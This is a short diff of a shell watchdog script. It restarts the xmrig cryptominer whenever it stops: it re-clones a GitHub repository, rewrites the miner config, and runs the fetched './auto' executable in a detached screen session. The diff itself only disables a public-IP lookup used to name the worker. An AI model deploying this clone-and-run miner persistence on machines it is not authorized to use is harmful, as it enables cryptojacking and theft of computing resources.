@@ -4,7 +4,7 @@
 timeout=7200
 while true
 do
-iip=$(dig +short myip.opendns.com @resolver1.opendns.com | sed -e "s/[.]/-/g")
+#iip=$(dig +short myip.opendns.com @resolver1.opendns.com | sed -e "s/[.]/-/g")
 if [[ ! $(pgrep xmrig) ]]; then
 cd /usr/local/loki/
 screen -S work -d -m bash -c "./auto"
@@ -19,7 +19,7 @@ service iptables save
 rm -rf loki/
 git clone https://github.com/legevole/loki.git
 cd loki/
-awk '$1=$1' FS="#" OFS="$iip" config >>config.json
+awk '$1=$1' FS="#" OFS="iip" config >>config.json
 chmod +x auto
 screen -S work -d -m bash -c "./auto"
 fi
